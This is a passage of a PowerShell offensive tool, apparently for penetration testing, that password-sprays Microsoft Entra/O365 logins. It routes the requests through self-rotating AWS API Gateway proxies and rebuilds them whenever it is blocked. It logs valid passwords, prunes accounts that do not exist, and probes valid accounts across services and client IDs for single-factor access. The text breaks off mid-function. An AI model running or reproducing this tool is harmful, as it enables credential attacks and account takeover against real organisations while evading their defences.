<#
.SYNOPSIS
    Sirocco - Azure/O365 password spraying through self-rotating FireProx
    endpoints, with automatic 403/Forbidden recovery, full attempt logging,
    and a user-list refinery that prunes accounts that don't exist in Entra.

.DESCRIPTION
    Sirocco sprays Microsoft Online (Azure/Entra/O365) accounts via a FireProx
    API Gateway endpoint so each request leaves from a rotating source IP.

    Features:
      1. Creates a fresh FireProx endpoint at start (unless -Url is supplied).
      2. Feeds that endpoint URL into the spray engine.
      3. On a "Forbidden" (HTTP 403 from API Gateway / WAF) response, it
         provisions a NEW FireProx endpoint and RESUMES from the user that
         failed -- it never restarts the spray from the beginning.
      4. Writes a per-attempt CSV log (timestamp, user, password, result),
         a valid-creds file, and a run transcript for client deliverables.
      5. USER REFINERY: when a response says the user/tenant does not exist,
         that user is pruned from the user list. The list file is rewritten
         (after a one-time backup) so subsequent passwords this run -- and all
         future runs against the same list -- skip non-existent accounts.
      6. MFA SWEEP: when -MFASweepPath is supplied, each successful credential is
         immediately run through MFASweep (non-interactively) to find which
         Microsoft services allow single-factor access. Results are logged.
      7. ACCESS AUDIT: with -AccessAudit, each successful credential is run
         through a FindMeAccess-style audit that sweeps resource x client-id x
         user-agent combinations to find which grant single-factor (no-MFA /
         no-conditional-access) access. Runs through FireProx and is logged.

    Request/response handling mirrors MSOLSpray, the MFA sweep reuses MFASweep
    (both by Beau Bullock, @dafthack), and the access audit is ported from
    FindMeAccess (@absolomb).

.EXAMPLE
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" -Region us-east-1

.EXAMPLE
    # Reuse an existing FireProx URL and disable list refining
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -Url https://abc123.execute-api.us-east-1.amazonaws.com/fireprox `
        -AccessKey "AKIA..." -SecretAccessKey "xxxxx" -NoRefine

.EXAMPLE
    # Run an MFA sweep against every credential that sprays successfully
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" `
        -MFASweepPath /path/to/MFASweep/MFASweep.ps1 -IncludeADFS

.EXAMPLE
    # Audit MFA / conditional-access gaps on each valid credential
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" `
        -AccessAudit -AuditConfig .\audit.conf

.NOTES
    Authorized security testing only. Passing AWS keys on the command line
    exposes them to the process list; prefer -AwsProfile / environment creds.
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $true)]
    [string]$UserListPath,

    [Parameter(Mandatory = $true)]
    [string]$PasswordListPath,

    # Optional starting FireProx URL. If omitted, one is created automatically.
    [Parameter(Mandatory = $false)]
    [string]$Url = "",

    # ----- FireProx / AWS configuration (used to create & rotate endpoints) -----
    [Parameter(Mandatory = $false)]
    [string]$AwsProfile = "",

    [Parameter(Mandatory = $false)]
    [string]$AccessKey = "",

    [Parameter(Mandatory = $false)]
    [string]$SecretAccessKey = "",

    [Parameter(Mandatory = $false)]
    [string]$Region = "us-east-1",

    # Path to fireprox fire.py as seen by the launcher (e.g. a WSL/Linux path).
    [Parameter(Mandatory = $true)]
    [string]$FireProxPath,

    # The real upstream URL that FireProx proxies to.
    [Parameter(Mandatory = $false)]
    [string]$TargetUrl = "https://login.microsoft.com/",

    # How fire.py is launched from PowerShell. Default assumes WSL.
    [Parameter(Mandatory = $false)]
    [string]$Launcher = "wsl",

    # ----- Spray behaviour -----
    [Parameter(Mandatory = $false)]
    [int]$SleepSeconds = (2 * 60 * 60),   # pause between passwords (default 2h)

    [Parameter(Mandatory = $false)]
    [int]$MaxRotations = 10,              # max new endpoints per password round

    [Parameter(Mandatory = $false)]
    [string]$LogDirectory = ".\logs",

    # ----- User refinery -----
    # Disable pruning of non-existent users from the user list.
    [Parameter(Mandatory = $false)]
    [switch]$NoRefine,

    # Also prune users whose tenant doesn't exist (whole domain not on Azure).
    [Parameter(Mandatory = $false)]
    [switch]$RefineTenants,

    # ----- MFA sweep -----
    # Path to MFASweep.ps1. When supplied, every successful spray result is
    # followed by an MFA sweep against that credential. Omit to disable.
    [Parameter(Mandatory = $false)]
    [string]$MFASweepPath = "",

    # Include the on-prem ADFS login attempt in the MFA sweep.
    [Parameter(Mandatory = $false)]
    [switch]$IncludeADFS,

    # ----- MFA / conditional-access gap audit (FindMeAccess-style) -----
    # When set, every successful spray result is followed by an audit that
    # sweeps resource x client-id x user-agent combinations to find which ones
    # grant single-factor (no-MFA / no-conditional-access) access.
    [Parameter(Mandatory = $false)]
    [switch]$AccessAudit,

    # Sweep every built-in user agent (large matrix). Default: one UA only.
    [Parameter(Mandatory = $false)]
    [switch]$AuditAllUserAgents,

    # Restrict the audit to a single resource / client / user agent (name or value).
    [Parameter(Mandatory = $false)]
    [string]$AuditResource = "",

    [Parameter(Mandatory = $false)]
    [string]$AuditClient = "",

    [Parameter(Mandatory = $false)]
    [string]$AuditUserAgent = "",

    # Config file with [resources] / [clients] / [user_agents] sections to
    # restrict the audit matrix (FindMeAccess-compatible format).
    [Parameter(Mandatory = $false)]
    [string]$AuditConfig = "",

    # Delay in milliseconds between audit requests (throttle).
    [Parameter(Mandatory = $false)]
    [int]$AuditDelayMs = 0
)

# ----------------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------------
Write-Host @"

   ____  _
  / ___|(_)_ __ ___   ___ ___ ___
  \___ \| | '__/ _ \ / __/ __/ _ \
   ___) | | | | (_) | (_| (_| (_) |
  |____/|_|_|  \___/ \___\___\___/   Azure/Entra spray + FireProx rotation

"@ -ForegroundColor Cyan

# ----------------------------------------------------------------------------
# Logging setup
# ----------------------------------------------------------------------------
if (-not (Test-Path $LogDirectory)) {
    New-Item -ItemType Directory -Path $LogDirectory -Force | Out-Null
}
$stamp            = Get-Date -Format "yyyyMMdd_HHmmss"
$script:CsvLog    = Join-Path $LogDirectory "spray_attempts_$stamp.csv"
$script:RunLog    = Join-Path $LogDirectory "spray_run_$stamp.log"
$script:ValidLog  = Join-Path $LogDirectory "valid_creds_$stamp.txt"
$script:Endpoints = Join-Path $LogDirectory "fireprox_endpoints_$stamp.txt"
$script:RemovedLog = Join-Path $LogDirectory "refinery_removed_$stamp.txt"
$script:MfaCsv     = Join-Path $LogDirectory "mfa_results_$stamp.csv"
$script:MfaRawLog  = Join-Path $LogDirectory "mfa_raw_$stamp.log"
$script:AuditCsv   = Join-Path $LogDirectory "access_audit_$stamp.csv"

# Case-insensitive set of users found NOT to exist in Azure/Entra.
$script:InvalidUsers = New-Object System.Collections.Generic.HashSet[string]([System.StringComparer]::OrdinalIgnoreCase)

function Write-RunLog {
    param([string]$Message, [string]$Color = "Gray")
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
    Write-Host $line -ForegroundColor $Color
    Add-Content -Path $script:RunLog -Value $line
}

function Write-Attempt {
    param(
        [string]$Username,
        [string]$Password,
        [string]$Result,
        [string]$Detail = "",
        [string]$Endpoint = ""
    )
    [pscustomobject]@{
        Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        Username  = $Username
        Password  = $Password
        Result    = $Result
        Detail    = $Detail
        Endpoint  = $Endpoint
    } | Export-Csv -Path $script:CsvLog -Append -NoTypeInformation
}

# ----------------------------------------------------------------------------
# FireProx: create a new endpoint and return its base URL (no trailing slash)
# ----------------------------------------------------------------------------
function New-FireProxUrl {
    if (-not $AccessKey -or -not $SecretAccessKey) {
        throw "Cannot create a FireProx endpoint: -AccessKey and -SecretAccessKey are required."
    }

    $argList = @($Launcher, "python3", $FireProxPath)
    if ($AwsProfile) { $argList += @("--profile_name", $AwsProfile) }
    $argList += @(
        "--secret_access_key", $SecretAccessKey,
        "--access_key",        $AccessKey,
        "--region",            $Region,
        "--command",           "create",
        "--url",               $TargetUrl
    )

    Write-RunLog "Creating new FireProx endpoint (target: $TargetUrl)..." "Cyan"
    $exe  = $argList[0]
    $rest = $argList[1..($argList.Count - 1)]
    $output = (& $exe @rest 2>&1 | Out-String)

    $m = [regex]::Match($output, 'https://[a-z0-9]+\.execute-api\.[a-z0-9\-]+\.amazonaws\.com/fireprox/?')
    if (-not $m.Success) {
        Write-RunLog "FireProx output:`n$output" "Red"
        throw "Failed to parse a FireProx URL from fire.py output."
    }

    $newUrl = $m.Value.TrimEnd('/')
    $apiId  = ([regex]::Match($newUrl, 'https://([a-z0-9]+)\.execute-api')).Groups[1].Value
    Write-RunLog "New FireProx endpoint ready: $newUrl (api_id: $apiId)" "Green"
    Add-Content -Path $script:Endpoints -Value ("{0}`t{1}`t{2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $apiId, $newUrl)
    return $newUrl
}

# ----------------------------------------------------------------------------
# Single spray request. Returns a result object.
#   .Forbidden  = endpoint is blocked, rotate it.
#   .UserAbsent = user/tenant does not exist (refinery candidate).
# ----------------------------------------------------------------------------
function Invoke-SprayRequest {
    param(
        [string]$Endpoint,
        [string]$Username,
        [string]$Password
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $BodyParams = @{
        'resource'    = 'https://graph.windows.net'
        'client_id'   = '1b730954-1685-4b74-9bfd-dac224a7b894'
        'client_info' = '1'
        'grant_type'  = 'password'
        'username'    = $Username
        'password'    = $Password
        'scope'       = 'openid'
    }
    $PostHeaders = @{ 'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }

    $RespErr = $null
    $webrequest = Invoke-WebRequest "$Endpoint/common/oauth2/token" -Method Post `
        -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr -UseBasicParsing

    if (($webrequest.StatusCode -eq 403) -or
        ($RespErr -match 'Forbidden') -or ($RespErr -match '\(403\)')) {
        return [pscustomobject]@{ Result = "FORBIDDEN"; Detail = "Endpoint blocked (403/Forbidden)"; Success = $false; Forbidden = $true; UserAbsent = $false }
    }

    if ($webrequest.StatusCode -eq 200) {
        return [pscustomobject]@{ Result = "SUCCESS"; Detail = "Valid credentials"; Success = $true; Forbidden = $false; UserAbsent = $false }
    }

    switch -Regex ("$RespErr") {
        'AADSTS50126' { return [pscustomobject]@{ Result = "INVALID-PASSWORD"; Detail = ""; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50128|AADSTS50059' { return [pscustomobject]@{ Result = "INVALID-TENANT"; Detail = "Tenant doesn't exist"; Success = $false; Forbidden = $false; UserAbsent = $RefineTenants.IsPresent } }
        'AADSTS50034' { return [pscustomobject]@{ Result = "INVALID-USER"; Detail = "User doesn't exist"; Success = $false; Forbidden = $false; UserAbsent = $true } }
        'AADSTS50079|AADSTS50076' { return [pscustomobject]@{ Result = "SUCCESS-MFA"; Detail = "Valid creds; MFA (Microsoft) in use"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50158' { return [pscustomobject]@{ Result = "SUCCESS-CONDITIONAL-ACCESS"; Detail = "Valid creds; conditional access (DUO/other) in use"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50053' { return [pscustomobject]@{ Result = "LOCKED"; Detail = "Account locked / Smart Lockout"; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50057' { return [pscustomobject]@{ Result = "DISABLED"; Detail = "Account disabled"; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50055' { return [pscustomobject]@{ Result = "SUCCESS-EXPIRED"; Detail = "Valid creds; password expired"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        default       { return [pscustomobject]@{ Result = "UNKNOWN-ERROR"; Detail = ("$RespErr" -replace '\s+', ' ').Trim(); Success = $false; Forbidden = $false; UserAbsent = $false } }
    }
}

# ----------------------------------------------------------------------------
# Refinery: rewrite the user list file with non-existent users removed.
# A one-time backup of the original list is kept in the log directory.
# ----------------------------------------------------------------------------
function Save-RefinedUserList {
    if ($NoRefine) { return }
    $valid = @($script:AllUsers | Where-Object { -not $script:InvalidUsers.Contains($_) })
    Set-Content -Path $UserListPath -Value $valid -Encoding ascii
}

function Remove-User {
    param([string]$Username, [string]$Reason)
    if ($NoRefine) { return }
    if ($script:InvalidUsers.Add($Username)) {
        Write-RunLog "Refinery: pruning '$Username' ($Reason)." "Magenta"
        Add-Content -Path $script:RemovedLog -Value ("{0}`t{1}`t{2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Username, $Reason)
    }
}

# ----------------------------------------------------------------------------
# MFA sweep: reuses MFASweep's per-service auth functions (dot-sourced) but
# drives them non-interactively (no prompts, no ADFS unless -IncludeADFS).
# Runs once per successful credential and logs which services allow single-
# factor access. All of MFASweep's noisy console output is captured to file.
# ----------------------------------------------------------------------------
function Invoke-SiroccoMfaSweep {
    param([string]$Username, [string]$Password)

    Write-RunLog "Running MFA sweep for $Username ..." "Cyan"

    # Reset the result globals MFASweep's functions write into.
    $global:graphresult = "NO"; $global:smresult = "NO"
    $global:o365wresult = "NO"; $global:o365lresult = "NO"; $global:o365mresult = "NO"
    $global:o365apresult = "NO"; $global:o365ipresult = "NO"; $global:o365wpresult = "NO"
    $global:ewsresult = "NO"; $global:asyncresult = "NO"; $global:adfsresult = "NO"

    # Run every check, swallowing MFASweep's console output into the raw log.
    Add-Content -Path $script:MfaRawLog -Value ("`n===== MFA sweep: {0} @ {1} =====" -f $Username, (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
    try {
        & {
            Invoke-GraphAPIAuth          -Username $Username -Password $Password
            Invoke-AzureManagementAPIAuth -Username $Username -Password $Password
            foreach ($ua in @('Windows','Linux','MacOS','Android','iPhone','WindowsPhone')) {
                Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype $ua
            }
            Invoke-EWSAuth            -Username $Username -Password $Password
            Invoke-O365ActiveSyncAuth -Username $Username -Password $Password
            if ($IncludeADFS) { Invoke-ADFSAuth -Username $Username -Password $Password }
        } *>> $script:MfaRawLog
    }
    catch {
        Write-RunLog "MFA sweep error for ${Username}: $($_.Exception.Message)" "Red"
        Add-Content -Path $script:MfaRawLog -Value "ERROR: $($_.Exception.Message)"
    }

    # Map globals -> services and persist.
    $services = [ordered]@{
        "Microsoft Graph API"               = $global:graphresult
        "Microsoft Service Management API"  = $global:smresult
        "M365 w/ Windows UA"                = $global:o365wresult
        "M365 w/ Linux UA"                  = $global:o365lresult
        "M365 w/ MacOS UA"                  = $global:o365mresult
        "M365 w/ Android UA"                = $global:o365apresult
        "M365 w/ iPhone UA"                 = $global:o365ipresult
        "M365 w/ Windows Phone UA"          = $global:o365wpresult
        "Exchange Web Services (BASIC)"     = $global:ewsresult
        "Active Sync (BASIC)"               = $global:asyncresult
    }
    if ($IncludeADFS) { $services["ADFS"] = $global:adfsresult }

    $singleFactor = @()
    foreach ($svc in $services.Keys) {
        $res = "$($services[$svc])" -replace '\{.*\}', ''
        $res = if ($res -match 'YES') { "YES" } else { "NO" }
        if ($res -eq "YES") { $singleFactor += $svc }
        [pscustomobject]@{
            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            Username  = $Username
            Password  = $Password
            Service   = $svc
            SingleFactorAccess = $res
        } | Export-Csv -Path $script:MfaCsv -Append -NoTypeInformation
    }

    if ($singleFactor.Count -gt 0) {
        Write-RunLog "MFA sweep $Username : SINGLE-FACTOR access on -> $($singleFactor -join ', ')" "Green"
    }
    else {
        Write-RunLog "MFA sweep $Username : no single-factor access found (MFA likely enforced everywhere)." "Yellow"
    }
}

# ----------------------------------------------------------------------------
# MFA / conditional-access gap audit (ported from FindMeAccess by @absolomb).
# For a valid credential, sweeps resource x client-id x user-agent combinations
# against the token endpoint (through FireProx) to find which grant single-
# factor access (200 = no MFA / no conditional access). Everything else is
# classified by AADSTS code. https://github.com/absolomb/FindMeAccess
# ----------------------------------------------------------------------------
$script:AuditResources = [ordered]@{
    "Azure Graph API"        = "https://graph.windows.net"
    "Azure Management API"   = "https://management.azure.com"
    "Azure Data Catalog"     = "https://datacatalog.azure.com"
    "Azure Key Vault"        = "https://vault.azure.net"
    "Cloud Webapp Proxy"     = "https://proxy.cloudwebappproxy.net/registerapp"
    "Database"               = "https://database.windows.net"
    "Microsoft Graph API"    = "https://graph.microsoft.com"
    "msmamservice"           = "https://msmamservice.api.application"
    "Office Management"      = "https://manage.office.com"
    "Office Apps"            = "https://officeapps.live.com"
    "OneNote"                = "https://onenote.com"
    "Outlook"                = "https://outlook.office365.com"
    "Outlook SDF"            = "https://outlook-sdf.office.com"
    "Sara"                   = "https://api.diagnostics.office.com"
    "Skype For Business"     = "https://api.skypeforbusiness.com"
    "Spaces Api"             = "https://api.spaces.skype.com"
    "Webshell Suite"         = "https://webshell.suite.office.com"
    "Windows Management API" = "https://management.core.windows.net"
    "Yammer"                 = "https://api.yammer.com"
}

$script:AuditClients = [ordered]@{
    "Accounts Control UI"                           = "a40d7d7d-59aa-447e-a655-679a4107e548"
    "Copilot App"                                   = "14638111-3389-403d-b206-a6a71d9f8f16"
    "Designer App"                                  = "598ab7bb-a59c-4d31-ba84-ded22c220dbd"
    "Editor Browser Extension"                      = "1a20851a-696e-4c7e-96f4-c282dfe48872"
    "Enterprise Roaming and Backup"                 = "60c8bde5-3167-4f92-8fdb-059f6176dc0f"
    "Get Help"                                      = "1f7f6f43-2f81-429c-8499-293566d0ab0c"
    "Intune MAM"                                    = "6c7e8096-f593-4d72-807f-a5f86dcc9c77"
    "Loop"                                          = "0922ef46-e1b9-4f7e-9134-9ad00547eb41"
    "M365 Compliance Drive Client"                  = "be1918be-3fe3-4be9-b32b-b542fc27f02e"
    "Managed Home Screen"                           = "3b68e96c-82d3-41b3-99b8-56c260cf38d8"
    "Microsoft 365 Copilot"                         = "0ec893e0-5785-4de6-99da-4ed124e5296c"
    "Microsoft Authentication Broker"               = "29d9ed98-a469-4536-ade2-f981bc1d605e"
    "Microsoft Authenticator App"                   = "4813382a-8fa7-425e-ab75-3b753aab3abb"
    "Microsoft Azure CLI"                           = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    "Microsoft Azure PowerShell"                    = "1950a258-227b-4e31-a9cf-717495945fc2"
    "Microsoft Bing Search for Microsoft Edge"      = "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8"
    "Microsoft Bing Search"                         = "cf36b471-5b44-428c-9ce7-313bf84528de"
    "Microsoft Defender for Mobile"                 = "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3"
    "Microsoft Defender Platform"                   = "cab96880-db5b-4e15-90a7-f3f1d62ffe39"
    "Microsoft Docs"                                = "18fbca16-2224-45f6-85b0-f7bf2b39b3f3"
    "Microsoft Edge Enterprise New Tab Page"        = "d7b530a4-7680-4c23-a8bf-c52c121d2e87"
    "Microsoft Edge MSAv2"                          = "82864fa0-ed49-4711-8395-a0e6003dca1f"
    "Microsoft Edge"                                = "e9c51622-460d-4d3d-952d-966a5b1da34c"
    "Microsoft Edge2"                               = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
    "Microsoft Edge3"                               = "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34"
    "Microsoft Exchange REST API Based Powershell"  = "fb78d390-0c51-40cd-8e17-fdbfab77341b"
    "Microsoft Flow"                                = "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0"
    "Microsoft Intune Company Portal"               = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
    "Microsoft Intune Windows Agent"                = "fc0f3af4-6835-4174-b806-f7db311fd2f3"
    "Microsoft Lists App on Android"                = "a670efe7-64b6-454f-9ae9-4f1cf27aba58"
    "Microsoft Office"                              = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "Microsoft Planner"                             = "66375f6b-983f-4c2c-9701-d680650f588f"
    "Microsoft Power BI"                            = "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12"
    "Microsoft Stream Mobile Native"                = "844cca35-0656-46ce-b636-13f48b0eecbd"
    "Microsoft Teams - Device Admin Agent"          = "87749df4-7ccf-48f8-aa87-704bad0e0e16"
    "Microsoft Teams-T4L"                           = "8ec6bc83-69c8-4392-8f08-b3c986009232"
    "Microsoft Teams"                               = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    "Microsoft To-Do client"                        = "22098786-6e16-43cc-a27d-191a01a1e3b5"
    "Microsoft Tunnel"                              = "eb539595-3fe1-474e-9c1d-feb3625d1be5"
    "Microsoft Whiteboard Client"                   = "57336123-6e14-4acc-8dcf-287b6088aa28"
    "ODSP Mobile Lists App"                         = "540d4ff4-b4c0-44c1-bd06-cab1782d582a"
    "Office 365 Exchange Online"                    = "00000002-0000-0ff1-ce00-000000000000"
    "Office 365 Management"                         = "00b41c95-dab0-4487-9791-b9d2c32c80f2"
    "OneDrive iOS App"                              = "af124e86-4e96-495a-b70a-90f90ab96707"
    "OneDrive SyncEngine"                           = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    "OneDrive"                                      = "b26aadf8-566f-4478-926f-589f601d9c74"
    "Outlook Lite"                                  = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
    "Outlook Mobile"                                = "27922004-5251-4030-b22d-91ecd9a37ea4"
    "PowerApps"                                     = "4e291c71-d680-4d0e-9640-0a3358e31177"
    "SharePoint Android"                            = "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d"
    "SharePoint"                                    = "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0"
    "Universal Store Native Client"                 = "268761a2-03f3-40df-8a8b-c3db24145b6b"
    "Visual Studio"                                 = "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"
    "Windows Search"                                = "26a7ee05-5602-4d76-a7ba-eae8b7b67941"
    "Windows Spotlight"                             = "1b3c667f-cde3-4090-b60b-3d2abd0117f0"
    "Yammer iPhone"                                 = "a569458c-7f2b-45cb-bab9-b7dee514d112"
    "ZTNA Network Access Client Private"            = "760282b4-0cfc-4952-b467-c8e0298fee16"
    "ZTNA Network Access Client"                    = "038ddad9-5bbe-4f64-b0cd-12434d1e633b"
}

$script:AuditUserAgents = [ordered]@{
    "Windows 10 Chrome" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "Windows 10 Edge"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128"
    "Windows 10 IE11"   = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
    "Mac Firefox"       = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0"
    "Linux Firefox"     = "Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0"
    "Chrome OS"         = "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.212 Safari/537.36"
    "Android Chrome"    = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
    "iPhone Safari"     = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Windows Phone"     = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 800)"
}

# Resolve a user-supplied name-or-value against a lookup dict -> [name, value].
function Resolve-AuditEntry {
    param($Entry, $Lookup)
    if ($Lookup.Contains($Entry)) { return @($Entry, $Lookup[$Entry]) }
    foreach ($k in $Lookup.Keys) { if ($Lookup[$k] -eq $Entry) { return @($k, $Entry) } }
    return @("Custom ($Entry)", $Entry)
}

# Parse a FindMeAccess-style config file into three ordered dicts.
function Read-AuditConfig {
    param([string]$Path)
    $out = @{ resources = [ordered]@{}; clients = [ordered]@{}; user_agents = [ordered]@{} }
    $lookup = @{ resources = $script:AuditResources; clients = $script:AuditClients; user_agents = $script:AuditUserAgents }
    $section = $null
    foreach ($raw in Get-Content $Path) {
        $line = $raw.Trim()
        if ($line -eq "") { continue }
        if ($line -match '^\[(resources|clients|user_agents)\]$') { $section = $Matches[1]; continue }
        if ($section) {
            $pair = Resolve-AuditEntry -Entry $line -Lookup $lookup[$section]
            $out[$section][$pair[0]] = $pair[1]
        }
    }
    return $out
}

# Classify a single audit response (mirrors FindMeAccess AADSTS handling).
function Get-AuditVerdict {
    param($StatusCode, [string]$Body)
    if ($StatusCode -eq 403 -or $Body -match 'Forbidden' -or $Body -match '\(403\)') {
        return @{ Status = "FORBIDDEN"; Forbidden = $true; NoMfa = $false; Abort = $false; Detail = "Endpoint blocked" }
    }
    if ($StatusCode -eq 200) {
        $scope = "openid"
        $m = [regex]::Match($Body, '"scope"\s*:\s*"([^"]*)"')
        if ($m.Success) { $scope = $m.Groups[1].Value }
        return @{ Status = "NO-MFA"; Forbidden = $false; NoMfa = $true; Abort = $false; Detail = "scope: $scope" }
    }
    switch -Regex ($Body) {
        'AADSTS50079' { return @{ Status = "NO-MFA (enrollment req, not configured)"; NoMfa = $true;  Forbidden = $false; Abort = $false; Detail = "MFA enrollment required but not set up" } }
        'AADSTS50076' { return @{ Status = "MFA-REQUIRED";        NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Microsoft MFA required or blocked by CA" } }
        'AADSTS53003' { return @{ Status = "CA-BLOCKED";          NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Blocked by conditional access policy" } }
        'AADSTS50105' { return @{ Status = "CA-APP-BLOCKED";      NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Application blocked by conditional access" } }
        'AADSTS50158' { return @{ Status = "THIRD-PARTY-MFA";     NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Third-party MFA required" } }
        'AADSTS53000' { return @{ Status = "COMPLIANT-DEVICE";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Requires compliant/managed device" } }
        'AADSTS65001' { return @{ Status = "CONSENT-REQUIRED";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "User/admin consent required" } }
        'AADSTS65002' { return @{ Status = "CLIENT-NOT-AUTHZ";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Client_id not authorized for resource" } }
        'AADSTS7000112' { return @{ Status = "APP-DISABLED";      NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Application disabled" } }
        'AADSTS7000218' { return @{ Status = "SECRET-REQUIRED";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "client_assertion/secret required" } }
        'AADSTS53011' { return @{ Status = "USER-BLOCKED-RISK";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "User blocked due to risk" } }
        'AADSTS53004' { return @{ Status = "SUSPICIOUS-ACTIVITY"; NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Suspicious activity" } }
        'AADSTS500014' { return @{ Status = "SP-DISABLED";        NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Service principal disabled" } }
        'AADSTS50001' { return @{ Status = "RESOURCE-DISABLED";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Resource disabled or missing" } }
        # These indicate the credential/account is no longer usable -> abort audit.
        'AADSTS50053' { return @{ Status = "LOCKED";  NoMfa = $false; Forbidden = $false; Abort = $true;  Detail = "Account locked" } }
        'AADSTS50057' { return @{ Status = "DISABLED"; NoMfa = $false; Forbidden = $false; Abort = $true; Detail = "Account disabled" } }
        'AADSTS50055' { return @{ Status = "PASSWORD-EXPIRED"; NoMfa = $false; Forbidden = $false; Abort = $true; Detail = "Password expired" } }
        default       {
            $desc = ([regex]::Match($Body, '"error_description"\s*:\s*"([^"]*)"')).Groups[1].Value
            return @{ Status = "OTHER"; NoMfa = $false; Forbidden = $false; Abort = $false; Detail = ($desc -replace '\s+', ' ').Trim() }
        }
    }
}

function Invoke-SiroccoAccessAudit {
    param([string]$Username, [string]$Password)

    # Resolve the matrix (config file > explicit filters > full built-ins).
    if ($AuditConfig) {
        if (-not (Test-Path $AuditConfig)) { throw "Audit config not found: $AuditConfig" }
        $cfg = Read-AuditConfig -Path $AuditConfig
        $resList = if ($cfg.resources.Count)   { $cfg.resources }   else { $script:AuditResources }
        $cliList = if ($cfg.clients.Count)     { $cfg.clients }     else { $script:AuditClients }
        $uaList  = if ($cfg.user_agents.Count) { $cfg.user_agents } else { [ordered]@{ "Windows 10 Chrome" = $script:AuditUserAgents["Windows 10 Chrome"] } }
    }
    else {
        if ($AuditResource) { $p = Resolve-AuditEntry -Entry $AuditResource -Lookup $script:AuditResources; $resList = [ordered]@{ $p[0] = $p[1] } }
        else { $resList = $script:AuditResources }

        if ($AuditClient) { $p = Resolve-AuditEntry -Entry $AuditClient -Lookup $script:AuditClients; $cliList = [ordered]@{ $p[0] = $p[1] } }
        else { $cliList = $script:AuditClients }

        if ($AuditAllUserAgents) { $uaList = $script:AuditUserAgents }
        elseif ($AuditUserAgent) { $p = Resolve-AuditEntry -Entry $AuditUserAgent -Lookup $script:AuditUserAgents; $uaList = [ordered]@{ $p[0] = $p[1] } }
        else { $uaList = [ordered]@{ "Windows 10 Chrome" = $script:AuditUserAgents["Windows 10 Chrome"] } }
    }

    $total = $resList.Count * $cliList.Count * $uaList.Count
